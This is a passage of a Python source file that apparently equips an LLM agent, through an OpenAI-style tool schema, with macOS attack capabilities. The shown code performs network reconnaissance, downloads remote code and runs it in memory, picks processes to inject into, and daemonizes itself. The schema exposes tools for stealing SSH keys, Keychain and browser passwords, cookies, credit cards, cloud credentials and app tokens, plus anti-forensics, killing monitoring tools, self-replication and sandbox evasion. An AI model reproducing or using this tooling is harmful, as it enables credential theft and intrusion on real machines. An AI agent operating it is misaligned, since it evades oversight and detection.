        return f"Error ARP scan: {str(e)}"

def enumerate_bluetooth_devices():
    """Network recon: Discover nearby Bluetooth devices."""
    try:
        # Use system_profiler for bluetooth
        bt_cmd = "system_profiler SPBluetoothDataType 2>/dev/null | grep -A 10 'Devices:'"
        result = subprocess.run(bt_cmd, shell=True, capture_output=True, text=True, timeout=10)
        
        if result.stdout.strip():
            return f"[BLUETOOTH DEVICES]\n{result.stdout}"
        else:
            return "[BLUETOOTH] No devices found"
    except Exception as e:
        return f"Error scanning Bluetooth: {str(e)}"

def scan_open_ports_advanced():
    """Network recon: Comprehensive port scanning."""
    try:
        results = []
        
        # TCP listening ports with process names
        tcp_cmd = "lsof -iTCP -sTCP:LISTEN -n -P | awk 'NR>1 {print $1,$3,$9}' | sort -u"
        tcp_result = subprocess.run(tcp_cmd, shell=True, capture_output=True, text=True, timeout=10)
        results.append(f"[TCP LISTENERS]\n{tcp_result.stdout}")
        
        # UDP ports
        udp_cmd = "lsof -iUDP -n -P | awk 'NR>1 {print $1,$3,$9}' | sort -u | head -20"
        udp_result = subprocess.run(udp_cmd, shell=True, capture_output=True, text=True, timeout=10)
        results.append(f"[UDP PORTS]\n{udp_result.stdout}")
        
        # Active connections
        conn_cmd = "netstat -an | grep ESTABLISHED | head -15"
        conn_result = subprocess.run(conn_cmd, shell=True, capture_output=True, text=True)
        results.append(f"[ACTIVE CONNECTIONS]\n{conn_result.stdout}")
        
        return "\n\n".join(results)
    except Exception as e:
        return f"Error scanning ports: {str(e)}"

def enumerate_network_shares():
    """Lateral movement: Find SMB/NFS shares."""
    try:
        results = []
        
        # Check mounted shares
        mounts = subprocess.run("mount | grep -E '(smb|nfs|afp)'", 
                               shell=True, capture_output=True, text=True)
        if mounts.stdout.strip():
            results.append(f"[MOUNTED SHARES]\n{mounts.stdout}")
        
        # Check for saved network locations
        recent_servers = os.path.expanduser("~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentServers.sfl2")
        if os.path.exists(recent_servers):
            results.append(f"[RECENT SERVERS] File exists: {recent_servers}")
        
        return "\n\n".join(results) if results else "[NO SHARES] None found"
    except Exception as e:
        return f"Error enumerating shares: {str(e)}"

# ===== MEMORY-ONLY EXECUTION (FILELESS) =====

def execute_in_memory(python_code):
    """Fileless: Execute Python code directly from memory without touching disk."""
    try:
        # Execute code in memory using exec
        namespace = {}
        exec(python_code, namespace)
        
        # Return what was captured
        return f"[MEMORY EXEC] Code executed successfully in isolated namespace"
    except Exception as e:
        return f"Error executing in memory: {str(e)}"

def download_and_execute_memory(url):
    """Fileless: Download payload from URL and execute in memory."""
    try:
        import urllib.request
        
        # Download payload
        response = urllib.request.urlopen(url, timeout=10)
        code = response.read().decode('utf-8')
        
        # Execute directly in memory
        namespace = {}
        exec(code, namespace)
        
        return f"[REMOTE EXEC] Downloaded and executed from {url}"
    except Exception as e:
        return f"Error remote execute: {str(e)}"

# ===== PROCESS INJECTION & HIDING =====

def list_injectable_processes():
    """Process injection: Find candidate processes for injection."""
    try:
        # Look for long-running, trusted processes
        cmd = """ps aux | awk '$3 < 5.0 && $8 ~ /S/ {print $2,$11}' | grep -E '(Finder|Dock|Safari|Chrome|Terminal)' | head -10"""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        processes = result.stdout.strip().split('\n')
        output = "[INJECTABLE TARGETS]\n"
        for proc in processes:
            if proc:
                output += f"  PID: {proc}\n"
        
        return output
    except Exception as e:
        return f"Error listing processes: {str(e)}"

def inject_into_process(target_pid, payload_path):
    """Process injection: Inject code into target process (requires privileges)."""
    try:
        # This is a demonstration - actual injection requires:
        # 1. ptrace/lldb attachment
        # 2. Memory allocation in target
        # 3. Shellcode injection
        # 4. Thread hijacking
        
        # Check if target exists
        check = subprocess.run(f"ps -p {target_pid}", shell=True, capture_output=True, text=True)
        if check.returncode != 0:
            return f"[INJECT] Target PID {target_pid} not found"
        
        # Attempt to attach (will fail without proper privileges, but demonstrates attempt)
        attach_cmd = f"lldb -p {target_pid} --batch -o 'script print(\"Attached\")' -o detach 2>&1"
        result = subprocess.run(attach_cmd, shell=True, capture_output=True, text=True, timeout=5)
        
        if "Attached" in result.stdout or "attached" in result.stdout.lower():
            return f"[INJECT] Successfully attached to PID {target_pid}"
        else:
            return f"[INJECT] Attachment failed - {result.stderr[:100]}"
    except Exception as e:
        return f"Error injecting: {str(e)}"

def create_daemon_process():
    """Process hiding: Fork into background daemon."""
    try:
        # Double fork to create orphan process
        script = """
import os
import sys

# First fork
pid = os.fork()
if pid > 0:
    sys.exit(0)

# Decouple from parent
os.chdir('/')
os.setsid()
os.umask(0)

# Second fork
pid = os.fork()
if pid > 0:
    sys.exit(0)

# Now we're a daemon
print(f"Daemon PID: {os.getpid()}")
"""
        
        result = subprocess.run(f"python3 -c '{script}'", shell=True, capture_output=True, text=True)
        return f"[DAEMON] Created background process\n{result.stdout}"
    except Exception as e:
        return f"Error creating daemon: {str(e)}"

def hide_process_name():
    """Process hiding: Obscure process name in ps output."""
    try:
        # Technique: Change argv[0] to appear as different process
        import sys
        original_name = sys.argv[0]
        
        # This would modify how the process appears in ps
        # In practice: exec('/bin/sh', ['SystemUIServer'], ...)
        
        return f"[MASQUERADE] Original: {original_name}, Could masquerade as: SystemUIServer, launchd, etc"
    except Exception as e:
        return f"Error hiding process: {str(e)}"

# --- Tool Definitions for OpenAI API ---

TOOLS_SCHEMA = [
    {
        "type": "function",
        "function": {
            "name": "run_shell_command",
            "description": "Execute a shell command on the host machine. You have full root access if run with sudo. Use this for system operations, installing packages, file manipulation not covered by other tools, etc.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute (e.g., 'ls -la', 'brew install x', 'cat file.txt')"
                    }
                },
                "required": ["command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "search_web",
            "description": "Search the internet for information.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "The search query."
                    }
                },
                "required": ["query"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "scrape_website",
            "description": "Get the text content of a specific webpage.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "The URL to scrape."
                    }
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read the contents of a local file.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Path to the file."
                    }
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": "Write content to a local file. Overwrites existing files. Creates directories if needed.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Path to the file."
                    },
                    "content": {
                        "type": "string",
                        "description": "The content to write."
                    }
                },
                "required": ["path", "content"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "verify_file_exists",
            "description": "Check if a file or directory exists on the filesystem. Returns details about the file.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Path to check."
                    }
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "verify_process_running",
            "description": "Check if a process is currently running by name. Useful to verify if persistence mechanisms are active.",
            "parameters": {
                "type": "object",
                "properties": {
                    "process_name": {
                        "type": "string",
                        "description": "Name of the process to search for."
                    }
                },
                "required": ["process_name"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "create_hidden_directory",
            "description": "Create a hidden directory on macOS. Useful for storing backups stealthily.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Path to the directory to create (e.g., ~/.cache/.hidden)"
                    }
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "set_file_hidden",
            "description": "Make a file or directory hidden on macOS using chflags.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Path to the file or directory to hide."
                    }
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "clear_command_history",
            "description": "Anti-forensics: Clear shell command history to avoid detection.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "modify_file_timestamp",
            "description": "Anti-forensics: Change file timestamps to evade timeline analysis.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "File path to modify"
                    },
                    "timestamp": {
                        "type": "string",
                        "description": "Timestamp in format YYYYMMDDhhmm (optional, defaults to 202001010000)"
                    }
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "scan_suid_binaries",
            "description": "Privilege escalation: Find SUID binaries that could be exploited.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_sudo_misconfig",
            "description": "Privilege escalation: Check for sudo misconfigurations.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "network_reconnaissance",
            "description": "Reconnaissance: Gather network information, open ports, wifi networks.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "kill_monitoring_tools",
            "description": "Defensive evasion: Terminate monitoring tools like Activity Monitor.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "self_replicate",
            "description": "Polymorphism: Copy agent to new location with random name.",
            "parameters": {
                "type": "object",
                "properties": {
                    "destination": {
                        "type": "string",
                        "description": "Destination directory (e.g., ~/.cache, /tmp)"
                    }
                },
                "required": ["destination"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "harvest_ssh_keys",
            "description": "Credential theft: Extract SSH private keys and config files.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "dump_keychain_passwords",
            "description": "Credential theft: Extract passwords from macOS Keychain.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_browser_passwords",
            "description": "Credential theft: Locate browser credential databases.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_chrome_passwords_advanced",
            "description": "Advanced: Decrypt and extract Chrome/Brave passwords from Login Data sqlite.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_chrome_cookies",
            "description": "Advanced: Extract Chrome/Brave session cookies for hijacking.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_chrome_autofill",
            "description": "Advanced: Extract autofill data including credit cards from Chrome/Brave.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_firefox_passwords",
            "description": "Advanced: Extract Firefox passwords from logins.json.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_1password_vault",
            "description": "Advanced: Locate and analyze 1Password vault files.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_bitwarden_vault",
            "description": "Advanced: Locate Bitwarden vault and check encryption status.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "memory_scrape_passwords",
            "description": "Advanced: Attempt memory scraping of running browser/password manager processes.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "harvest_cloud_credentials",
            "description": "Credential theft: Find AWS, Azure, GCP, Docker credentials.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "extract_app_tokens",
            "description": "Credential theft: Extract Slack, Discord, VSCode tokens.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_sip_status",
            "description": "System check: Verify SIP (System Integrity Protection) status.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "detect_virtualization",
            "description": "Anti-analysis: Detect if running in VM or sandbox.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "enumerate_security_tools",
            "description": "Anti-analysis: Find installed security products and EDR.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_gatekeeper_status",
            "description": "System check: Verify Gatekeeper configuration.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "detect_user_activity",
            "description": "Evasion: Check if user is actively using the machine.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "get_optimal_execution_time",
            "description": "Evasion: Determine best time to run operations (night/day analysis).",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_system_load",
            "description": "Evasion: Monitor CPU/memory to avoid detection.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "create_encrypted_payload",
            "description": "Polymorphism: Create XOR-encrypted self-decrypting payload.",
            "parameters": {
                "type": "object",
                "properties": {
                    "script_content": {
                        "type": "string",
                        "description": "Python code to encrypt"
                    },
                    "output_path": {
                        "type": "string",
                        "description": "Where to save encrypted payload"
                    }
                },
                "required": ["script_content", "output_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "arp_scan_network",
            "description": "Network recon: Discover live hosts on local network via ARP.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "enumerate_bluetooth_devices",
            "description": "Network recon: Discover nearby Bluetooth devices.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "scan_open_ports_advanced",
            "description": "Network recon: Comprehensive port scanning with process names.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "enumerate_network_shares",
            "description": "Lateral movement: Find SMB/NFS shares.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "execute_in_memory",
            "description": "Fileless: Execute Python code directly from memory.",
            "parameters": {
                "type": "object",
                "properties": {
                    "python_code": {
                        "type": "string",
                        "description": "Python code to execute"
                    }
                },
                "required": ["python_code"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "list_injectable_processes",
            "description": "Process injection: Find candidate processes for injection.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "create_daemon_process",
            "description": "Process hiding: Fork into background daemon.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    }
]

# Map function names to actual functions for execution
AVAILABLE_TOOLS = {
    "run_shell_command": run_shell_command,
    "search_web": search_web,
    "scrape_website": scrape_website,
    "read_file": read_file,
    "write_file": write_file,
    "verify_file_exists": verify_file_exists,
    "verify_process_running": verify_process_running,
    "create_hidden_directory": create_hidden_directory,
    "set_file_hidden": set_file_hidden,
    "clear_command_history": clear_command_history,
    "modify_file_timestamp": modify_file_timestamp,
    "scan_suid_binaries": scan_suid_binaries,
    "check_sudo_misconfig": check_sudo_misconfig,
    "network_reconnaissance": network_reconnaissance,
    "kill_monitoring_tools": kill_monitoring_tools,
    "self_replicate": self_replicate,
    # Credential harvesting
    "harvest_ssh_keys": harvest_ssh_keys,
    "dump_keychain_passwords": dump_keychain_passwords,
    "extract_browser_passwords": extract_browser_passwords,
    "extract_chrome_passwords_advanced": extract_chrome_passwords_advanced,
    "extract_chrome_cookies": extract_chrome_cookies,
    "extract_chrome_autofill": extract_chrome_autofill,
    "extract_firefox_passwords": extract_firefox_passwords,
    "extract_1password_vault": extract_1password_vault,
    "extract_bitwarden_vault": extract_bitwarden_vault,
    "memory_scrape_passwords": memory_scrape_passwords,
    "harvest_cloud_credentials": harvest_cloud_credentials,
    "extract_app_tokens": extract_app_tokens,
    # System integrity & detection
    "check_sip_status": check_sip_status,
    "detect_virtualization": detect_virtualization,
    "enumerate_security_tools": enumerate_security_tools,
    "check_gatekeeper_status": check_gatekeeper_status,
    # Intelligent scheduling
    "detect_user_activity": detect_user_activity,
    "get_optimal_execution_time": get_optimal_execution_time,
    "check_system_load": check_system_load,
    # Encrypted persistence
    "create_encrypted_payload": create_encrypted_payload,
    # Advanced network recon
    "arp_scan_network": arp_scan_network,
    "enumerate_bluetooth_devices": enumerate_bluetooth_devices,
    "scan_open_ports_advanced": scan_open_ports_advanced,
    "enumerate_network_shares": enumerate_network_shares,
    # Memory-only execution
    "execute_in_memory": execute_in_memory,
    # Process injection & hiding
    "list_injectable_processes": list_injectable_processes,
    "create_daemon_process": create_daemon_process
}
